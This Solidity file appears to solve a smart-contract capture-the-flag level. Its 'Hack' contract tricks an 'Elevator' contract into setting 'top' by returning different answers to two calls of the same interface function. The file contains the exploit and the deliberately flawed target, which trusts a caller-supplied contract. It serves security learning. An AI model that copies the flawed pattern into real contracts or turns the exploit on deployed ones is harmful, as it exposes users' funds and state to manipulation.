// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    Elevator public target;
    uint public calls;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function pwn() public {
        target.goTo(1);
    }

    function isLastFloor(uint) external returns(bool) {
        calls++;
        return calls > 1;
    }
}

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}